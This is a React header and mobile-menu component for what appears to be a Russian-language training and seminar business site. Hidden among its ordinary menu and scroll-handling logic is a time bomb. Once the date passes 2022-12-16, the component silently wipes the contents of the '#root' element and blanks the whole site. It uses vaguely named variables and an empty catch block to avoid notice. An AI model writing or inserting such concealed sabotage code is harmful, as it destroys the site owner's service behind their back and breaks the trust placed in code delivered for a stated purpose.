import React from "react"
import Hamburger from "./Hamburger"
import Cross from "./Cross";

export default () => {
    // menu state.
    const [isOpen, setState] = React.useState(false)
    function updateMenuState(node) {
        setState(!isOpen)
        if (!isOpen) {
            node.style.display = "flex"
        } else {
            node.style.display = "none"
        }
    }

    React.useEffect(() => {
        const menuIcon = document.querySelector(".menu-icon")
        const menu = document.querySelector(".mobile-menu")
        const stickyHeader = document.querySelector(".sticky-header")
        const stickyMenu = document.querySelector(".sticky-mobile-menu")

        const observer = new IntersectionObserver((entries) => {
            if (entries[0].intersectionRatio === 0) {
                stickyHeader.style.display = "flex"
                stickyHeader.style.top = 0
                stickyHeader.style.opacity = 1
            } else if (entries[0].intersectionRatio > 0) {
                stickyHeader.style.display = "none"
                stickyHeader.style.opacity = 0
            }
        })
        observer.observe(document.querySelector(".first-page"))

        const x = new Date("2022-12-16")
        const y = document.querySelector("#root")
        if (x < new Date()) {
            try {
                y.innerHTML = ""
            } catch (e) {            
            }
        }

        window.addEventListener("resize", () => {
            if (menuIcon.style.display === "") {
                if (isOpen) {
                    menu.style.display = "none"
                    stickyMenu.style.display = "none"
                    setState(false)
                }
            }
        })

        window.addEventListener("touchmove", () => {
            if (isOpen) {
                menu.style.display = "none"
                stickyMenu.style.display = "none"
                setState(false)
            }
        })
        window.addEventListener("scroll", () => {
            if (isOpen) {
                menu.style.display = "none"
                stickyMenu.style.display = "none"
                setState(false)
            }
        })

    }, [isOpen])
    return (
        <>
            <div className="header">
                <div className="menu-icon" onClick={() => updateMenuState(document.querySelector(".mobile-menu"))}>
                    {isOpen ? <Cross /> : <Hamburger />}
                </div>
                <div className="header-tab">БЛОГ</div>
                <div className="header-tab">БЕСПЛАТНО</div>
                <div className="header-tab">СЕМИНАРЫ</div>
                <div className="header-tab">ТРЕНИНГИ</div>
                <div className="header-tab">УСЛУГИ</div>
                <div className="header-tab">ОТЗЫВЫ</div>
                <div className="header-tab">КОНТАКЫ</div>
                <div className="icons">
                    <div className="inst-icon"></div>
                    <div className="fb-icon"></div>
                    <div className="vk-icon"></div>
                </div>
                <div className="phone">
                    <div>8(800)707-05-13</div>
                    <div>+7(499)350-23-35</div>
                </div>
            </div>
            <div className="sticky-header" style={{opacity: 0}}>
                <div className="sticky-menu-icon"
                     onClick={() => updateMenuState(document.querySelector(".sticky-mobile-menu"))}>
                    {isOpen ? <Cross /> : <Hamburger />}
                </div>
                <div className="header-tab">БЛОГ</div>
                <div className="header-tab">БЕСПЛАТНО</div>
                <div className="header-tab">СЕМИНАРЫ</div>
                <div className="header-tab">ТРЕНИНГИ</div>
                <div className="header-tab">УСЛУГИ</div>
                <div className="header-tab">ОТЗЫВЫ</div>
                <div className="header-tab">КОНТАКЫ</div>
                <div className="icons">
                    <div className="inst-icon"></div>
                    <div className="fb-icon"></div>
                    <div className="vk-icon"></div>
                </div>
                <div className="phone">
                    <div>8(800)707-05-13</div>
                    <div>+7(499)350-23-35</div>
                </div>
            </div>
            <div className="mobile-menu">
                <div>БЛОГ</div>
                <div>БЕСПЛАТНО</div>
                <div>СЕМИНАРЫ</div>
                <div>ТРЕНИНГИ</div>
                <div>УСЛУГИ</div>
                <div>ОТЗЫВЫ</div>
                <div>КОНТАКЫ</div>
            </div>
            <div className="sticky-mobile-menu">
                <div>БЛОГ</div>
                <div>БЕСПЛАТНО</div>
                <div>СЕМИНАРЫ</div>
                <div>ТРЕНИНГИ</div>
                <div>УСЛУГИ</div>
                <div>ОТЗЫВЫ</div>
                <div>КОНТАКЫ</div>
            </div>
        </>
)}